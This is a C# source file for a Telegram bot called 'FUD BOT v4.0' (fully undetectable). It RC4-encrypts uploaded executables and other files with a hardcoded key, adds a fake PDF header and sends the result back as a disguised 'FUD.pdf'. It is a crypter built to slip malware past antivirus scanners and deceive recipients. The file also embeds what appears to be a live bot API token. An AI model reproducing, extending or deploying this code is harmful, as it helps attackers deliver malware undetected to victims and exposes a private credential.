using System.Text;
using System.Text.Json;
using System.Linq;

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();

var app = builder.Build();

app.MapGet("/", () => "FUD BOT v4.0 LIVE! EXE/PDF/JSON/XML → FUD.pdf");
app.MapGet("/health", () => "OK");

static byte[] RC4(byte[] data, byte[] key) {
    var s = Enumerable.Range(0, 256).Select(i => (byte)i).ToArray();
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key.Length]) % 256;
        (s[i], s[j]) = (s[j], s[i]);
    }
    var result = new byte[data.Length];
    int i2 = 0, k = 0;
    for (int n = 0; n < data.Length; n++) {
        i2 = (i2 + 1) % 256;
        k = (k + s[i2]) % 256;
        (s[i2], s[k]) = (s[k], s[i2]);
        result[n] = (byte)(data[n] ^ s[(s[i2] + s[k]) % 256]);
    }
    return result;
}

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var body = await reader.ReadToEndAsync();
    
    using var document = JsonDocument.Parse(body);
    var update = document.RootElement;
    
    if (update.TryGetProperty("message", out var message)) {
        var client = clientFactory.CreateClient();
        
        // /start
        if (message.TryGetProperty("text", out var textElem) && textElem.GetString() == "/start") {
            using var form = new MultipartFormDataContent();
            if (message.TryGetProperty("chat", out var chat) && chat.TryGetProperty("id", out var chatId)) {
                form.Add(new StringContent(chatId.GetInt64().ToString()), "chat_id");
                form.Add(new StringContent("🚀 **FUD v4.0** Send .exe .pdf .json .xls .xlsx .xml → **FUD.pdf**\n🔑 FUD2026KEY!"), "text");
                form.Add(new StringContent("markdown"), "parse_mode");
            }
            await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", form);
            return;
        }
        
        // Files → FUD.pdf
        if (message.TryGetProperty("document", out var docElement)) {
            if (docElement.TryGetProperty("file_id", out var fileId) && 
                docElement.TryGetProperty("file_name", out var fileNameElem)) {
                var filename = fileNameElem.GetString()!;
                if (filename.EndsWith(".exe") || filename.EndsWith(".pdf") || 
                    filename.EndsWith(".json") || filename.EndsWith(".xls") || 
                    filename.EndsWith(".xlsx") || filename.EndsWith(".xml")) {
                    
                // Get file
                using var formData = new MultipartFormDataContent();
                formData.Add(new StringContent(fileId.GetString()!), "file_id");
                var fileResponse = await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile", formData);
                var fileJson = await fileResponse.Content.ReadAsStringAsync();
                using var fileDoc = JsonDocument.Parse(fileJson);
                var filePath = fileDoc.RootElement.GetProperty("result").GetProperty("file_path").GetString()!;
                
                // Download
                var fileUrl = $"https://api.telegram.org/file/bot{BOT_TOKEN}/{filePath}";
                var fileBytes = await client.GetByteArrayAsync(fileUrl);
                
                // RC4 Encrypt
                var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
                var encrypted = RC4(fileBytes, key);
                
                // PDF Stego: %PDF header + payload
                var pdfHeader = Encoding.UTF8.GetBytes("%PDF-1.4\n%FUD2026\n");
                var fudPdf = pdfHeader.Concat(encrypted).ToArray();
                
                // Send FUD.pdf
                if (message.TryGetProperty("chat", out var chat2) && chat2.TryGetProperty("id", out var chatId2)) {
                    var chatId = chatId2.GetInt64();
                    using var pdfContent = new MultipartFormDataContent();
                    pdfContent.Add(new StringContent(chatId.ToString()), "chat_id");
                    var pdfStream = new MemoryStream(fudPdf);
                    pdfContent.Add(new StreamContent(pdfStream), "document", $"fud-{filename}.pdf");
                    pdfContent.Add(new StringContent($"✅ **FUD.pdf!**\n🔑 `FUD2026KEY!`\n📁 {filename}\n📄 RC4 Stego PDF"), "caption");
                    pdfContent.Add(new StringContent("markdown"), "parse_mode");
                    await client.PostAsync("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument", pdfContent);
                }
            }
        }
    }
    }
});

app.Run();
